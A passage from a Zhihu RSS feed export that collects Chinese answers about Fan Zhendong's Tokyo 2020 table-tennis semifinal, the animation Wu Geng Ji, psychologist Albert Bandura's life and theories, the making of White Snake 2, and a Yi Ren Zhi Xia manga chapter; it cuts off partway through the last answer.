伏，好几次回合间的特写都可以从微表情看出他非常的紧张。这不由得让笔者为这场比赛的结果感到担心。</p>\n<p>第六局，樊振东大比分领先，士气也在线。笔者本以为差不多稳了，结果在接下来的接发球中，樊振东异常保守。小小林本是为了拼死搏杀几个，结果发现个个都上了，士气一下就恢复了。笔者眼看着比分拉近干着急。后小小林一鼓作气拿下该局，再没让樊振东拿到一分，笔者的心情可以说跌入了谷底。</p>\n<p>最惊心动魄的抢七开始。局间休息，解说员还在那里煞有闲事地聊混双。笔者虽知他们也很紧张，是为了调节气氛，但仍不禁暗骂晦气。但好在樊振东一路打得都比较顺，而小林的搏杀状态终于终于终于（这里要说三次，因为撑到这里实在太难得了）有了下滑。樊振东得以取得领先，比分到了8比4。</p>\n<p>笔者心里希望樊振东千万别像上一局那样松劲。但比分事与愿违，还是被逐渐拉近了些。这时笔者已经无心去分析技术了，大家都是老对手，现在只是在看双方的心理了；更何况大家都有能力拧起来互殴，一球球抠线路已经完全没有必要。好在樊振东没有受到前一局的影响，虽被追了数分，但自己也有所得分，率先拿到局点，并在之后的均势拉锯中四两拨千斤，拿下至关重要的一分，获得了半决赛的胜利！</p>\n<p>此时笔者脑海里只有“百炼成钢、破茧成蝶”之类的话，樊振东也经受住了考验。但笔者更想把这些话留到决赛之后。让我们拭目以待吧。另外，小小林打得真不错，应该说是非常出色。相信将来也会是在历史上留名的最顶级运动员之一。如果能把中台正手补上就更好了。</p>\n<p>艰难比赛看多了，不妨来看看虐菜爽文局：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic4.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic3.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475814903/answer/2026857855?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">276 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475759119?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛陈梦 4:0 胜于梦雨进决赛，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/475494265?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运乒乓球男单 1/4 决赛樊振东 4:0 横扫韩国选手郑荣植晋级 4 强？</a><br>\n","link":"http://www.zhihu.com/question/475814903/answer/2026857855?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价玄机出品的动画《武庚纪》第四季第一集，如何看待逆天而行之死？","date":"2021-07-29 11:30:09","description":"\n<p>古有王婆卖瓜，今有我们武庚纪编剧组来回答这个问题——如何评价国产动画《武庚纪》第四季第一集。</p>\n<p>先为动画做个简单的科普，《武庚纪》的故事则是由商王之子武庚为起点的，衍生至三界万年的传说。在故事的发展中，人族不屈于神的奴役，追求独立自由的生活；冥族为生存为荣耀而战；人、神、冥三大种族纷争不断，不断有新的人物登场，追求他们心中的信念，完成他们命定的使命，在挑战与被挑战的路上，让人感受热血沸腾的力量。</p>\n<p>本次《武庚纪》新篇章《问天之战》，人、神、冥三大种族的战斗将迎来高潮，逆天而行、子羽以及武庚都将对战力天花板“天”发出挑战，尘封在时间长河中的远古旧神之战将再次展开，武庚在本季也会面对更强的对手，不得不更快地成长！</p>\n<p>我相信，只要是《武庚纪》的粉丝，一定都很期待这部分内容。第一集的标题就叫《终点》，暗示冥族大元帅“逆天而行”走到了他生命的尽头，但这也是神权瓦解的开始，三界格局变化的开始，当然还是第四季精彩故事的开始。编剧在写逆天而行最后一战时，也有万般不舍，不过更多的是触动。他是十万年冥族战士的缩影，也是散落三界火种的象征。我们不禁问道：有些事明知是对的，却又明知不可为，还会有奋力为之、奔向终点的勇气吗？是啊，就像逆天而行说的“很多事并非尽力就可以成功”，“但会在‘ 我们’手中完成”。</p>\n<p>所以第一集讲了一个“死亡”的故事，希望给观众展现“生命”的光芒。这种光芒不只属于主角光环，而是每个角色的内心力量。之后集数，还会有形形色色的新角色——旧神登场，他们不仅有传奇色彩的名字，更有因绽放各自生命而迥异的魅力。</p>\n<p>在第一集播出后，我们也收到了众多粉丝恭送大元帅的真心。看到逆天而行的人物塑造能收获大家的认同，非常开心，正所谓一千个观众心里有一千个哈姆雷特，在逆天而行踏上他命运的同时，我们也将这部分的评价权交由一直以来支持我们的观众，期待你们说出对这个悲壮角色的感受。</p>\n<p>回归这个故事，说是一场人类自救之旅也不过。当商王焚毁“天”之神谕，举旗逆天，人类的自我觉醒和为自由独立而战的决心已然萌芽。后面又遇到同样去推翻神权的盟友，冒出来一个又一个的厉害角色，我们想要展现的和观众想要看到的，就是如神挡，则可以杀神；如天挡，也逆天而行的决心和快意。</p>\n<p>最后，《武庚纪之问天之战》究竟会有什么新故事？目前动画也有了更新，还是希望大家去观看、去感受，有关于剧集的任何问题，都欢迎大家在评论区和我们探讨。</p>\n<p>感谢大家对《武庚纪》动画的支持！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wu-geng-ji-dong-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">武庚纪动画</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475547867/answer/2027215850?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">4 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/266852944?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">动画《秦时明月》系列有哪些bug？</a><br><a href=\"http://www.zhihu.com/question/310818438?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价动画《天行九歌》第二季预告?</a><br>\n","link":"http://www.zhihu.com/question/475547867/answer/2027215850?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"心理学家阿尔伯特·班杜拉（Albert Bandura）2021.7.28 逝世，如何评价他的一生？","date":"2021-07-29 08:30:10","description":"\n<p>今天我才知道班杜拉老师跟我们是同一时代的人，可悲的是我一直以为他已经去世了。作为一名老师，大学当中对于班杜拉的“<b>交互决定论</b>”、“<b>自我调节机制</b>”以及<b>社会学习理论</b>非常感兴趣，可以说他的很多理论指导了我论文的撰写。</p>\n<h2>一、班杜拉的一生</h2>\n<p>1925年，班杜拉出生于加拿大阿尔伯塔省的一个小农场社区，他的家庭来自东欧，移民至加拿大。他的父母没有正式读过书，但是他们非常看重孩子的教育。班杜拉在加拿大拿到本科文凭后，1949年在不列颠哥伦比亚大学获生物学学士学位。</p>\n<p>在这之后，班杜拉攻读艾奥瓦大学研究生（因为这个大学在<b>学习理论</b>方面传统颇深），在这里他遇到了一位对他产生深刻影响的人——肯尼斯·斯宾塞。在艾奥瓦大学的学习过程中，班杜拉逐渐坚信，心理学者应该“以经得起试验检验的方式把临床现象概念化”。于1952年获得博士学位。</p>\n<p>班杜拉于1953年来到斯坦福大学，继续在<b>传统学习理论和认知人格理论之间、在临床心理学和人格研究的实证取向之间架设桥梁</b>。于1974年当选为美国心理学协会主席，并在1980年获得美国心理学会颁发的杰出科学贡献奖。</p>\n<h2>二、核心理论</h2>\n<h3>1.社会认知理论</h3>\n<p>由于人总是生活在一定的社会条件下的,所以班杜拉主张要在<b>自然的社会情境</b>中而不是在实验室里研究人的行为。事实上,人们在社会情境中,通过观察和模仿,学到很多行为。</p>\n<p>班杜拉不同意其他行为主义者对人的描述——外界刺激无论以怎样的方式施加于人，人都是被动接受者，这忽视了人类行为的一些重要原因。由于这些被忽视的东西一般都与思维和信息符号加工有关，所以班杜拉称自己的理论为社会认知理论。</p>\n<p><b>□交互决定论</b></p>\n<p>班杜拉认为行为是由内因和外因共同决定，但是并非是由二者的简单结合来决定，在此基础上他提出了交互决定论的概念：即<b>外因和内因是一个相互作用的影响系统中的一部分</b>，它不仅影响行为，也影响系统中的其他部分。</p>\n<p>我们举一个例子：加入有个你不喜欢的人找你玩游戏，但是你觉得与他度过一个下午是非常无趣的一件事，那么这时你的内因占了主导，决定拒绝；不过他说如果你陪他一起玩，他可以送你一款游戏，这时的外因逐渐压制内因而占据主导，于是决定与他一起玩。而当你与他一起玩时，因为获得了自己喜欢的游戏而感觉与他一起度过的下午非常有趣。<b>在这种情况下，行为改变了你的期望，而这个期望又会影响以后的行为，这样循环往复</b>。</p>\n<p>所以简单来说，交互决定论便是系统中的每一部分——<b>行为、外因和内因，彼此互相影响</b>。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-72283a1cdb8849b7890d3c3b2ffe775f_720w.jpg?rss\" data-rawwidth=\"350\" data-rawheight=\"275\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-72283a1cdb8849b7890d3c3b2ffe775f\" data-watermark-src=\"v2-07adf343d271f1edbcc9f0f987ac003e\" data-private-watermark-src=\"v2-daa484be2b5034aa386bab829967de85\"></p>\n<p><b>□自我调节机制</b></p>\n<p>班杜拉认为<b>多数行为是在没有外部强化或惩罚的情况下发生的</b>，我们的日常行为主要由自我调节机制所控制。很多人给自己的奖励是因为达到了自己设定的目标而带来的完成干和自我价值感。</p>\n<p>当然，自我调节也包括了<b>自我惩罚</b>。当我们没能够坚持自己的目标或者标准时，会常常感到丢脸或者抑郁。比如一个减肥的人有时在私底下因为没有克制住嘴巴而惩罚自己。</p>\n<p><b>□自我效能原理</b></p>\n<p>班杜拉于1977年首次提到了自我效能这一概念。他把自我效能看作是<b>对自己在特定的情境中是否有能力操作行为的预期。</b>他认为预期是认知与行为的中介,是行为的决定因素。他进一步把预期分为<b>结果预期和效能预期。</b></p>\n<ul>\n<li>结果预期是对某种行为导致某种结果的个人预测;</li>\n<li>效能预期是个人对自己能否顺利地进行某种行为以产生一定结果的预期。</li>\n</ul>\n<blockquote>\"效能预期不只影响活动和场合的选择,也对努力程度产生影响。被知觉到的效能预期是人们遇到应激情况时选择什么活动、花费多大力气、支持多长时间的努力的主要决定者。\"——班杜拉</blockquote>\n<p>班杜拉在1980年发表的《人类行为中的自我效能机制》演说中,指出效能的自我感知影响思维模式、行动和情绪激活。80年代以后,班杜拉把自我效能看作是对行为操作能力的知觉和有关恪守自我生成能力的信念。这样一来,班图拉提出了两个概念:<b>自我效能感和自我效能信念</b>。</p>\n<ul>\n<li>知觉到的自我效能是一种对自我生成能力的知觉,被感知到的自我效能结果即自我效能感。自我效能感深化到价值系统就成为自我效能信念,即有关自我能力判断的认知取向。</li>\n<li>班杜拉与他的学生对自我效能的形成条件及其对行为的影响进行了大量的研究,发现自我效能的形成依赖于以下五种信息源的影响:<b>行为的成败经验、替代性经验、言语劝说、情绪的唤起、情境条件</b>。</li>\n</ul>\n<blockquote>人们常常放弃可以实现的挑战，因为他们认为那还需要超乎寻常的才能。当然，与生俱来的能力限制着人们力所能及的范围。但通过广泛的有指导的努力，潜能可以转化为功能现实。人们看到他人的非凡技艺，但没有看到他人为此毫不犹豫的献身和难以计数的坚持努力。这种偏颇的信息一般使得人们过高估计固有天赋而低估人类成就中的自我调节因素。——班杜拉《自我效能》</blockquote>\n<h3>2.社会观察</h3>\n<p>班杜拉的社会认知理论中对理解人类行为和人格的最重要贡献，莫过于创立了替代学习或称<b>观察学习</b>的概念。班杜拉反复强调,<b>人类的许多行为都是通过观察他人的行为及其结果而习得的。</b>人类习得的许多东西,诸如语言、社会规范、态度和情感等,很难用试误学习来解释,而用观察学习来解释则很容易说得通。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-783a2e69d07d6a5b706402dab06a9fa2_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"397\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-783a2e69d07d6a5b706402dab06a9fa2\" data-watermark-src=\"v2-5af795eed75ff1119596f757c1eb91a2\" data-private-watermark-src=\"v2-791357cb67dd3f75b0fba1cba70dd575\"></p>\n<p><b>班杜拉认为观察学习和行为表现时由相互联系的四个过程组成。</b>人们必须<b>注意</b>攻击行为，<b>记住</b>攻击信息，把见到的行为<b>表现</b>出来，并<b>预期</b>奖励会随之而来。那么大多数情况下人们是无法走完这样一个完整的过程，但是总会有人走完，这批走完的人便是容易发生攻击性行为的个体。</p>\n<p>在班杜拉看来,观察学习最重要的作用之一,是<b>习得超越所观察到的特定反应之上的规则或原理</b>。他认为,在观察学习过程中,观察者要抽象出榜样行为的共同要素,并把这种行为恰当地运用于其它情境中去,尽管他们并没有看到过榜样在这些情境中做出这种行为。班杜拉认为,达种抽取特性并适当运用的能力,使得观察者的行为不仅仅局限在特定的榜样刺激范围内,这是人类行为多样化和灵活性的基础。他把这个过程称为<b>观察学习的高级形式</b>,这对人们掌握语言的语法规则来说是至关重要的。</p>\n<p>班社拉还认为,现实学习是创造性行为的一个主要来源。当观察者看到众多不同的榜样时,会影响到他们自己的创造性表现。事实上,大多数榜样行为不只局限在所观察到的行为范围内,而往往是各种榜样特征的组合,这种行为组合不同于原先任何一种个别的榜样行为。因此,榜样越是多样化,观察者就越有可能做出创造性的反应。例如,<b>儿童看到同样的教师榜样,但他们会以不同的方式组合教师的特征,因而从教师那里习得不同的行为特征,从而使他们的个性特征不同于任何一个特定的教师</b>。</p>\n<p>所以，老师的气质人格与教学风格将会成为儿童学习的隐性课程，这便是为何我们要抓师德师风、为何我们需要提升老师的价值感以及获得感的重要原因。 </p>\n<h2>三、评价</h2>\n<p>班杜拉的社会学习理论在本质上是一种<b>行为理论体系</b>。他的全部体系的基础，是他对人性的看法及 其对传统行为主义人性观的超越，在理论上表现为以交互决定论为核心的社会认知理论。他的理论体系的建立是他的理论勇气的产物，即将他对人性存在的行为层面的直观把握以理论体系的形式表达出来。</p>\n<p>早在1977年，班杜拉就指出，“<b>行为理论的分析一般说来是一种现象学的研究。在这些分析中，主要强调的是自我概念，它与想象中忽视自我评价经验的行为的研究方向是不相容的</b>。“（这样他便突破了传统的行为主义研究，但他依旧属于行为主义/社会学系学派）。</p>\n<p>班杜拉对观察学习的描述和解释客观地揭示了观察学习的一般过程和规律,对于解释和指导人类的观察学习过程有重要的理论价值和实践指导作用。对于学生的行为模式的学习,班杜拉的社会学习理论是最有说服力的。所以,<b>班杜拉的观察学习模式在学习理论中具有不可替代的独特作用</b>。他的理论成为了很多教师撰写相关研究论文的重要支撑。</p>\n<p>而班杜拉理论的局限性在<b>于它不适合于解释和说明陈述性知识的学习和复杂的、高难度的技能训练的过程,而仅适于解释和说明观察、模仿等社会性学习的过程。</b></p>\n<hr>\n<p>这里是喜爱知识分享的小稀 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/bec6ea2e0363580fab77141096441232\" data-hash=\"bec6ea2e0363580fab77141096441232\" data-hovercard=\"p$b$bec6ea2e0363580fab77141096441232\">@翼犀稀</a> ，喜欢我的可以点波关注哦！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yi-xi-63-68-55?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">翼犀稀</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475684348/answer/2026194701?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">53 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/36926678?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">是否曾有心理学家参与过改变世界的事件，真实地推进过历史进程？</a><br><a href=\"http://www.zhihu.com/question/403297600?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">心理学家能够完全了解另一个人的心么？</a><br>\n","link":"http://www.zhihu.com/question/475684348/answer/2026194701?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"《白蛇2：青蛇劫起》中小青的执念到底是什么？小青和小白之间是什么样的感情？","date":"2021-07-23 12:17:09","description":"\n<p>要回答如何看待小青的执念，我想先从我做动画的执念开始说起。</p>\n<p>我在动画行业工作20年了，中间经历了很多困难，也不是没有想过要放弃，要转行，但是却从来没有真的这样去做。</p>\n<p>今天《白蛇2：青蛇劫起》要上映了，前几天我们首映礼的时候，有观众说她哭了，说比第一部还精彩，我心里很受感动，很突然地想起来一句电影台词，“念念不忘，必有回响”。二十年的念念不忘，在2019年《白蛇：缘起》上映的时候得到了回响，在今天，也得到了回响。</p>\n<p>当初并没有想过《白蛇：缘起》能得到那么多的观众认可和支持，因为我们知道电影还有很多不足和遗憾，有这样的成绩是观众给予国产动漫和我们的包容和支持。所以在构思续集的时候，有着一份无型的压力和使命感，驱使我们在续集的创作过程中必须有更好的表现来回馈观众们对我们的支持。同时，我们自己也希望可以有所提升及进步。</p>\n<p>《白蛇：缘起》有幸入围昂西电影节，今年的7月30日，也将在日本上映。我们整个团队都很振奋也很紧张，打着“中国”标签的动画电影，被我们亲手创造出来，即将面对外国观众。</p>\n<p>说回到这一次，创作青蛇的故事上来。首先，在故事开发层面上，在《白蛇：缘起》上映之前，其实已经构思了大概十多个不同的方案。小白和阿宣的爱情故事已经在《白蛇：缘起》有了一个感人的结尾，在片尾天桥相会之后，我们认为这个家传户晓的《白蛇传》正传故事已经有这么多版经典的影视作品了，年轻观众对于小白许仙结婚生孩的故事可能也不会有很大的兴趣。</p>\n<p>《白蛇：缘起》上映之后，我们有透过跟观众交流，听到不少观众对于小青的故事有极大的兴趣。有别于小白的传统女性型象，小青的果敢、独立、敢爱敢恨的性格更靠近现代女性的形象，尤其是在《白蛇传》里小青对小白的姐妹情感令人动容。所以，我们决定要做一个不一样的小青出来。</p>\n<p>确定了故事主要方向后，我们花了大量时间研究了中国传统神话传说和故事，挖掘了相关的概念和题材，我们前期开发做了很多在电影里可能看不出来的设定。</p>\n<p>我们整个团队都一致觉得，小青对小白的情感，对小白的执着，是最能打动我们的部分，既然能打动我们，那一定也可以打动观众。最终，我们依托于小青的性格，决定为她创作一座城，一个只有心怀执念的人，才会落入的城，就是现在观众可以看到这座修罗城。</p>\n<p>为了使到观众在观影电影时对修罗城可信性，我们也做了很多的功课，比如说，城市应该是什么样，城里面有什么。</p>\n<p>衔尾蛇的设计，活着的城市，楼起楼塌，古今建筑交融，一个没有时间概念的地方，有各种劫难驱逐那些心有不甘的人离开，还有一些人不想离开，那就要想办法活下去。我们做了完整的关于修罗城的设定，设计了无池，设计了蛇尾长出来的如果桥，还有很多很多，然后我们选择了最能够凸显小青性格部分的地方来发生故事。</p>\n<p>要体现出小青对于执念的不放弃，也要体现出这个人物的成长和变化，我们希望在故事里，探讨一些比较现实主义的情感观点和执念。</p>\n<p>制作过程中，也遇到很多全新的挑战。</p>\n<p>整个修罗城的场景和角色资产量是前所未有庞大的。为此，我们把整个团队扩大到250人。特效，layout,动画镜头部门也是全面升级。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-090897bf7d471c39d4363ba744af6883_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-090897bf7d471c39d4363ba744af6883\" data-watermark-src=\"v2-c352f335d66a92187df43ceaed27e35c\" data-private-watermark-src=\"v2-4a4fe9f6a01978f2d37ea5af39095c5e\"></p>\n<p>罗刹帮身上的羽毛制作难道极高。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b358539ca3be9ff7aa6b99480b0927be_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-b358539ca3be9ff7aa6b99480b0927be\" data-watermark-src=\"v2-65785939b4a9c347c83f799874853f0d\" data-private-watermark-src=\"v2-f9ab2255862895f1e536b4f111642d79\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-136b4f9af75e4bc44d00eef8e0e34e32_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-136b4f9af75e4bc44d00eef8e0e34e32\" data-watermark-src=\"v2-f7dfeda99b53eb6275e9f881131fac4d\" data-private-watermark-src=\"v2-b0278fe7cb5475c5d424ecbaffbde11e\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c29b302eff8d41c42e32dfc0150351f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"452\" data-watermark=\"watermark\" data-original-src=\"v2-4c29b302eff8d41c42e32dfc0150351f\" data-watermark-src=\"v2-b02ac24c8b7e6f07718d865e539281b6\" data-private-watermark-src=\"v2-befc7bcbdd9bc114e7d761f8a9706116\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7a838277e17d54789a2ba0a658f697a5_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"451\" data-watermark=\"watermark\" data-original-src=\"v2-7a838277e17d54789a2ba0a658f697a5\" data-watermark-src=\"v2-2810a95d56650522cd04a526e42daac0\" data-private-watermark-src=\"v2-d3006393f088d71824f137310176c5b8\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-f8e1f15d7da1ab2df953cafe72b466c4_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-f8e1f15d7da1ab2df953cafe72b466c4\" data-watermark-src=\"v2-d717a3627bf18ab6963bd2f11e93f1f6\" data-private-watermark-src=\"v2-e519f36d7a1c43eb86aadee533e2db6d\"></p>\n<p>全片特效量镜头非常多，四劫，无池等特效镜头。水漫金山和黑风洞的水彩效果足足花了三年时间打磨，为了让小青有更好的表现力，我们把整个绑定系统全面更新，令小青有好的表现力，动画师能更好的发挥。大家有空可以看下我们的制作特辑。</p>\n<p>我们动画行业一直有受到游戏和其他相关行业高速发展的冲击，团队也面临人才流失的的挑战, 不少动画师纷纷转行。人手不足，驱使我们要想出更高效的制作方法。</p>\n<p>透过更多的使用动作捕捉，我们采取了把动作捕捉作为动作的根基，但同时可让动画师有更方便和快捷的方法，把动作补捉的数据可编辑化，这可使到动画师效率提升之余同时不会扼杀动画师的创意。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2c4456494f49324c1ae8a082a201e129_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4030\" data-rawheight=\"2808\" data-watermark=\"watermark\" data-original-src=\"v2-2c4456494f49324c1ae8a082a201e129\" data-watermark-src=\"v2-098a36ce12f172af9db4b178919331e9\" data-private-watermark-src=\"v2-e43becbeab18266956a7fd7d0a76a5ce\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-a10df7953c982c6b446d2f9929fa0bf1_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3029\" data-rawheight=\"4034\" data-watermark=\"watermark\" data-original-src=\"v2-a10df7953c982c6b446d2f9929fa0bf1\" data-watermark-src=\"v2-c2aaed8e94c0e73dfda5bd52b77ab436\" data-private-watermark-src=\"v2-65cb661a3cd1252e3c7a010b14beb13e\"></p>\n<a href=\"https://www.zhihu.com/video/1401990874365026304\">青蛇劫起动捕现场，模拟外力冲撞</a><a href=\"https://www.zhihu.com/video/1401991207640326144\">动画总监谢君伟指导动捕表演</a><a href=\"https://www.zhihu.com/video/1401991735967285249\">青蛇劫起里的幽灵怪动作参考</a><p>制作过程中也经历疫情，我们就自己开发了远程工作系统。那时候睁眼、闭眼，都是青蛇，青蛇，青蛇。</p>\n<p>虽然创作过程中充满着各种的磨难，但在这过程中使我们成长和更加坚强。</p>\n<p>在这个世界上，有“执念”，并且一直坚持下去做的人非常非常多，还有很多人坚持“执念”做出了非常了不起的事情，成为了我们的楷模。“执念”是当下观众和修罗城众生一样会遇到的问题，但每个人会怎么对待“执念”这个事情，我们就想通过这部电影来探讨。</p>\n<p>小青的“执念”是救出小白，打倒法海，推倒雷峰塔，实现她对小白的许诺，“我总会陪着你的”。她为了她的执念，付出了所有，不断成长，不断历练，她被背叛过，被欺骗过，但她心里一直都记得小白的善良和对天地有情，修罗城的残酷让她一次一次的回想起小白的好，也让她更加确定自己的“执念”。</p>\n<p>小青，就是每一个人的写照。</p>\n<p>我想为小青叫好。</p>\n<p><br></p>\n<p>谢谢大家对电影的喜欢和支持。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/amp-60?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">amp</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/473707179/answer/2015810318?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">185 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/473751887?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《白蛇2:青蛇劫起》中的哪些情节戳中了你的泪点？</a><br><a href=\"http://www.zhihu.com/question/474910716?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">《白蛇 2：青蛇劫起》结尾部分，小青和小白到底见着面了吗？最后那个回眸和那声「小青」到底是谁？</a><br>\n","link":"http://www.zhihu.com/question/473707179/answer/2015810318?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价《一人之下》漫画536（569）话？","date":"2021-07-23 11:30:07","description":"\n<p>漫画536（569）话，提出了邪祟这一概念；其实虽然之前一人之下中提到过多次正邪不两立的概念，但多是道德层面上的，这次是第一次在一人之下的功法体系中将正邪区分开来；这一区分，其实也为之前一些法术定了性了；所以这里就从个人角度来简单说一下一人之下中的正法与邪法（存在主观臆测）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-070a2226e22d4d7cfa2863386674b219_720w.jpg?rss\" data-rawwidth=\"1056\" data-rawheight=\"386\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-070a2226e22d4d7cfa2863386674b219\" data-watermark-src=\"v2-b1729b17287aa09b826d046718ed1afe\" data-private-watermark-src=\"\"></p>\n<blockquote>\n<b><i>观前提醒：</i></b><i>1，本文是以《一人之下》漫画与《孟子》为基础做的简单整理；不涉及具体细节，如果对个别人物或剧情感兴趣；希望大家关注原版漫画与官方信息；</i> <br><i>2，文中涉及的历史，巫术以及各门派的简介，都是仅在《一人之下》世界观的语境下，结合个人浅薄的认识做的片面介绍；带有一定的主观倾向，目的仅是为了更好的解释个人观点，希望大家不要在现实生活中对号入座；</i> 